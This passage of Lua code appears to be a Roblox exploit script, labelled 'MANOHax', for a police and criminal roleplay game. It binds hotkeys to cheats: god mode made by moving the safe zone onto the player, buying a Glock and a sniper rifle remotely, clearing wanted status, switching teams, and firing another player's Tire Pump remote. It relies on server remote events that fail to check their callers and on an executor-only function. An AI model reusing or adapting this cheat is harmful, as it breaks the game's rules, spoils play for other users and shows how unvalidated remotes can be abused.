		end 
		if input.KeyCode == Enum.KeyCode.LeftAlt then --Also, could be written as [[inputObject.KeyCode == "R"]]
	
	
			VehicleGear(currentSpeed+1)
			currentSpeed = currentSpeed+1
			print(currentSpeed)
			game.Players.LocalPlayer.PlayerGui.CarGui.Frame.Gear.Text = currentSpeed .. "/8"
		end 
		-- Reset
		if (input.KeyCode == Enum.KeyCode.RightControl and UIS:IsKeyDown(Enum.KeyCode.R)) or (input.KeyCode == Enum.KeyCode.R and UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
			local A_1 = tostring(game.Players.LocalPlayer.TeamColor)
			local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
			Event:FireServer(A_1)
		end
	
		------------------------------------------------------------
	
		-- God Mode
		if (input.KeyCode == Enum.KeyCode.RightShift and UIS:IsKeyDown(Enum.KeyCode.G)) or (input.KeyCode == Enum.KeyCode.G and UIS:IsKeyDown(Enum.KeyCode.RightShift)) then
			if(godmode == false)then
	
				godmode = true
				game:GetService("Players").LocalPlayer.PlayerGui.PlayerInfo["Player info"].RedeemCode.Text = "GOD"
				game:GetService("Players").LocalPlayer.PlayerGui.PlayerInfo["Player info"].RedeemCode.TextColor3 = Color3.new(255, 0, 4)
				game:GetService("Workspace").NORPZONE.NoRPZone.Size = Vector3.new(315.459, 37.278, 314.8)
				while godmode == true do
					game:GetService("Workspace").NORPZONE.NoRPZone.Position = game.Players.LocalPlayer.Character:WaitForChild("Head").Position
					wait()
				end
	
				print(godmode)
			else
				godmode = false
				print(godmode)
				game:GetService("Workspace").NORPZONE.NoRPZone.Position = Vector3.new(0,0,0)
				game:GetService("Players").LocalPlayer.PlayerGui.PlayerInfo["Player info"].RedeemCode.Text = "TWITTER CODE"
				game:GetService("Players").LocalPlayer.PlayerGui.PlayerInfo["Player info"].RedeemCode.TextColor3 = Color3.new(255, 255, 255)
			end
		end
	
		------------------------------------------------------------
	
		-- Rejoin
		if (input.KeyCode == Enum.KeyCode.RightControl and UIS:IsKeyDown(Enum.KeyCode.Backspace)) or (input.KeyCode == Enum.KeyCode.Backspace and UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
			local ts = game:GetService("TeleportService")
			local p = game:GetService("Players").LocalPlayer
			ts:Teleport(game.PlaceId, p)
		end
	
		------------------------------------------------------------
	
		-- Pump Tire
		if (input.KeyCode == Enum.KeyCode.RightShift and UIS:IsKeyDown(Enum.KeyCode.P)) or (input.KeyCode == Enum.KeyCode.P and UIS:IsKeyDown(Enum.KeyCode.RightShift)) then
			local player = game.Players.LocalPlayer
			local found = false
			local personwithpump;
			for i,v in pairs( player.Character.Vehicle:GetChildren())do
				if(v.Name == "Powered wheel" or v.Name == "Non-powered wheel" or  v.Name == "Wheel")then
					for e,o in pairs(game.Players:GetChildren()) do
						if(found == false)then
							if(o.Backpack:FindFirstChild("Tire Pump"))then
								personwithpump = o
								found = true
	
							end
						else
							local A_1 = v
							local Event = personwithpump.Backpack["Tire Pump"].RemoteEvent
							Event:FireServer(A_1)   
						end
	
					end
				end
			end
		end
	
		------------------------------------------------------------
	
		-- Launch Paintshop
		if (input.KeyCode == Enum.KeyCode.RightControl and UIS:IsKeyDown(Enum.KeyCode.P)) or (input.KeyCode == Enum.KeyCode.P and UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
			game.Players.LocalPlayer.PlayerGui.PaintshopGui["Paintshop GUI"].Visible = true
		end
	
		------------------------------------------------------------
		-- Glock
		if (input.KeyCode == Enum.KeyCode.RightControl and UIS:IsKeyDown(Enum.KeyCode.G)) or (input.KeyCode == Enum.KeyCode.G and UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
			local args = {
				[1]="Glock19(LEGAL)",
				[2]=1200,
				[3]="Cash"
			}
			workspace.DealersScript.BuyItem:InvokeServer(unpack(args))
		end
	
		------------------------------------------------------------
	
	
		-- Sniper
		if (input.KeyCode == Enum.KeyCode.RightControl and UIS:IsKeyDown(Enum.KeyCode.S)) or (input.KeyCode == Enum.KeyCode.S and UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
			local A_1 = "BFG-50(LEGAL)"
			local A_2 = 10000
			local A_3 = "Cash"
			local Event = game:GetService("Workspace").DealersScript.BuyItem
			Event:InvokeServer(A_1, A_2, A_3)
		end
	
		------------------------------------------------------------
	
		-- Remove Ticket
		if (input.KeyCode == Enum.KeyCode.RightControl and UIS:IsKeyDown(Enum.KeyCode.T)) or (input.KeyCode == Enum.KeyCode.T and UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
			local playergui = game:GetService("Players").LocalPlayer.PlayerGui
			for _, child in ipairs(playergui:GetChildren()) do
				--fireclickdetector(hackermodel.Part.ClickDetector)
				if(child.Name == "Ticket") then
					child:Destroy()
				end
			end
		end
	
		------------------------------------------------------------
	
	
		-- Remove Wanted
		if (input.KeyCode == Enum.KeyCode.RightControl and UIS:IsKeyDown(Enum.KeyCode.W)) or (input.KeyCode == Enum.KeyCode.W and UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
			local hackermodel = game:GetService("Workspace").Dealers["xRG_M's Hacker"]
			for _, child in ipairs(hackermodel:GetChildren()) do
				--fireclickdetector(hackermodel.Part.ClickDetector)
				if(child.Name == "Part") then
					print(child)
					for _, grandchild in ipairs(child:GetChildren()) do
						-- Something
						if(grandchild.Name == "NameTag") then
							child:Destroy()
						end
					end
				end
			end
			fireclickdetector(game:GetService("Workspace").Dealers["xRG_M's Hacker"].Part.ClickDetector)
	
			-- Script generated by R2Sv2
			-- R2Sv2 developed by Luckyxero
			wait(1)
			local Event = game:GetService("Players").LocalPlayer.PlayerGui.HackerShop["Gun Dealer"].REMOVEWANTED.LocalScript.RemoteFunction
			Event:InvokeServer()
		end
	
		------------------------------------------------------------
	
		-- Withdraw
		if (input.KeyCode == Enum.KeyCode.RightAlt and UIS:IsKeyDown(Enum.KeyCode.W)) or (input.KeyCode == Enum.KeyCode.W and UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
			local amount1 = game.Players.LocalPlayer.PlayerGui.Twitter.SystemPanel.TextBox.Text
			local args = {
				[1] = "Withdraw",
				[2] = tonumber(amount1)
			}
	
			game:GetService("ReplicatedStorage").ATMAction:FireServer(unpack(args))
		end
	
		-- Deposit
		if (input.KeyCode == Enum.KeyCode.RightAlt and UIS:IsKeyDown(Enum.KeyCode.D)) or (input.KeyCode == Enum.KeyCode.D and UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
			local amount1 = game.Players.LocalPlayer.PlayerGui.Twitter.SystemPanel.TextBox.Text
			local args = {
				[1] = "Deposit",
				[2] = tonumber(amount1)
			}
	
			game:GetService("ReplicatedStorage").ATMAction:FireServer(unpack(args))
		end
	
		------------------------------------------------------------
	
		-- Civilian Team
		if (input.KeyCode == Enum.KeyCode.RightAlt and UIS:IsKeyDown(Enum.KeyCode.One)) or (input.KeyCode == Enum.KeyCode.One and UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
			local A_1 = "Mid gray"
			local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
			Event:FireServer(A_1)
		end
	
		------------------------------------------------------------
	
		-- MCSO Team
		if (input.KeyCode == Enum.KeyCode.RightAlt and UIS:IsKeyDown(Enum.KeyCode.Two)) or (input.KeyCode == Enum.KeyCode.Two and UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
			local A_1 = "Bronze"
			local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
			Event:FireServer(A_1)
		end
	
		------------------------------------------------------------
	
		-- PSP Team
		if (input.KeyCode == Enum.KeyCode.RightAlt and UIS:IsKeyDown(Enum.KeyCode.Three)) or (input.KeyCode == Enum.KeyCode.Three and UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
			local A_1 = "Dark stone grey"
			local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
			Event:FireServer(A_1)
		end
	
		------------------------------------------------------------

		-- CMPD Team
		if (input.KeyCode == Enum.KeyCode.RightAlt and UIS:IsKeyDown(Enum.KeyCode.Four)) or (input.KeyCode == Enum.KeyCode.Four and UIS:IsKeyDown(Enum.KeyCode.RightAlt)) then
			local A_1 = "Navy blue"
			local Event = game:GetService("Workspace").TeamEventScript.TeamChangeEvent
			Event:FireServer(A_1)
		end

		------------------------------------------------------------

		-- Toggle On/Off
        if input.KeyCode == Enum.KeyCode.RightShift and Frame.Visible == true then
           Frame.Visible = false
        elseif input.KeyCode == Enum.KeyCode.RightShift and Frame.Visible == false then
           Frame.Visible = true
        end
		
		------------------------------------------------------------

		-- Change Version
		game:GetService("Players").LocalPlayer.PlayerGui["Version"].TextLabel.Text = "MANOHax on TOP!"
        game:GetService("Players").LocalPlayer.PlayerGui["Version"].TextLabel.TextColor3 = Color3.new(255, 0, 4)
        game:GetService("Players").LocalPlayer.PlayerGui["Version"].TextLabel.TextSize = 25

		------------------------------------------------------------

		-- Focus Textbox
		if (input.KeyCode == Enum.KeyCode.Semicolon) then
			wait(0.05)
			game.Players.LocalPlayer.PlayerGui.ii.Frame.TextBox:CaptureFocus()
		end
	end)
	
	
end
coroutine.wrap(LPFCW_fake_script)()
